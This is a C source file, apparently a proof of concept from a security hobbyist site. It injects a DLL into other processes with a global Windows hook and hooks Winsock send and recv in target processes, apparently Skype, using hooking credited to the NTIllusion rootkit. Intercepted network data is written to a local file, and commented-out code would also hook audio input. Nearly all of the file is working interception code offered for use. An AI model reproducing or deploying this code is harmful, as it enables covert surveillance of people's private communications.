/*
 * Tool name   : DLLToInject
 * Description : This is a proof of concept tool to show how to inject a DLL
 *               into a remote process and proxying functions to intercept
 *               data. The function hooking is copied from the NTIllusion userland
 *               rootkit. 
 * Author      : carrumba
 * Webpage     : http://www.megapanzer.com
 * Version     : 0.1
 * OS          : Tested on Microsoft Windows XP
 * Todo        : -
 *
 * Changes     : - 
 * 
 *
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */


#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#include "Hooking.h"
#include "DLLToInject.h"


#pragma comment(lib, "User32.lib")


char gProcName[MAX_BUF_SIZE + 1];
char *gLoaderName = "SkypeDLLInjector";

HANDLE hHook = 0;

byte *CG_send = NULL;
byte *CG_recv = NULL;




/*
 * For DLL injection purpose only
 *
 */


LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
  return CallNextHookEx((HHOOK) hHook, nCode, wParam, lParam); 
}


/*
 * As the function name already says : it's used to 
 * write debugging information into a file.
 *
 */

void printDebug(char *pMsg)
{
  FILE *mFH = NULL;

  if ((mFH = fopen("c:\\debug.txt", "a")) != NULL)
  {
    fprintf(mFH, "msg : \"%s\"\n", pMsg);
    fclose(mFH);
  }
}





/*
 * Load it and hijack it
 *
 */

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD  pLoadReason, LPVOID lpReserved)
{
  HINSTANCE mDLLHandle = NULL;
  FARPROC lSendFunc = NULL;
  FARPROC lRecvFunc = NULL;
  HINSTANCE hWSock = NULL;
  char mTemp[MAX_BUF_SIZE + 1];




  // if DllMain is called for process attach
  if(pLoadReason == DLL_PROCESS_ATTACH)
  {
    /*
     * Get Interface functions from the DLL and check its presence
     *
     */

	// Get host process name
	ZeroMemory(gProcName, sizeof(gProcName));
	GetModuleFileName(NULL, gProcName, MAX_BUF_SIZE);


ZeroMemory(mTemp, sizeof(mTemp));
snprintf(mTemp, sizeof(mTemp) - 1, "I DID IT!");
printDebug(mTemp);

//	hWinmm = LoadLibrary("Winmm.dll");
//	hDSound = LoadLibrary("DSound.dll");
   
    hWSock = LoadLibrary("Ws2_32.dll");

	/*
     * If the process which loaded this DLL is the loader itself, 
	 * then set the global windows hook!
     *
	 */

    if(strstr(gProcName, gLoaderName))
	{
	  hHook = SetWindowsHookEx(WH_CBT, HookProc, hModule, 0); 



	   ////
      // if the process, who loaded this dll, is skype, 
	 //  inject the proxy functions!
	//// 
	} else if (strstr(gProcName, TARGET1)
	        || strstr(gProcName, TARGET2)
			|| strstr(gProcName, TARGET3)
			   ) {

      /*
       * Hooking Winsock functions
       *
       */
      
      if((lSendFunc = GetProcAddress(hWSock, "send")) != NULL)
	    ForgeHook((DWORD) lSendFunc, (DWORD) MySend, &CG_send, "send");

      if((lRecvFunc = GetProcAddress(hWSock, "recv")) != NULL)
	    ForgeHook((DWORD) lRecvFunc, (DWORD) MyRecv, &CG_recv, "recv");

	  
	    ////
       // waveIns
      ////
/*
      if((pwaveInOpen = GetProcAddress(hWinmm, "waveInOpen")) != NULL)
	    ForgeHook((DWORD)pwaveInOpen, (DWORD)MywaveInOpen, &CG_waveInOpen, "waveinopen");


      if((pwaveInClose = GetProcAddress(hWinmm, "waveInClose")) != NULL)
	    ForgeHook((DWORD)pwaveInClose, (DWORD)MywaveInClose, &CG_waveInClose, "waveinclose");
*/


	}
  } else if(pLoadReason == DLL_PROCESS_DETACH) {
  } else if(pLoadReason == DLL_THREAD_ATTACH) {
  } else if(pLoadReason == DLL_THREAD_DETACH) {
  }

  return TRUE;
}



/*
 *
 *
 */
int WINAPI MySend(SOCKET s, const char *buf, int len, int flags)
{
  MYSEND lSendFunc = (MYSEND) CG_send;
char lTemp[MAX_BUF_SIZE + 1];

ZeroMemory(lTemp, sizeof(lTemp));
snprintf(lTemp, sizeof(lTemp) - 1, "MySend() : %s", buf);
printDebug(lTemp);

  if(!lSendFunc)
    return(0); //if function pointer is invalid...
  else
    return(lSendFunc(s, buf, len, flags));
}


/*
 *
 *
 */

int WINAPI MyRecv(SOCKET s, char *buf, int len, int flags)
{
  MYRECV lRecvFunc = (MYRECV) CG_recv;
char lTemp[MAX_BUF_SIZE + 1];

ZeroMemory(lTemp, sizeof(lTemp));
snprintf(lTemp, sizeof(lTemp) - 1, "MyRecv() : %s", buf);
printDebug(lTemp);

  if(!lRecvFunc)
    return(0); //if function pointer is invalid...
  else
    return(lRecvFunc(s, buf, len, flags));
}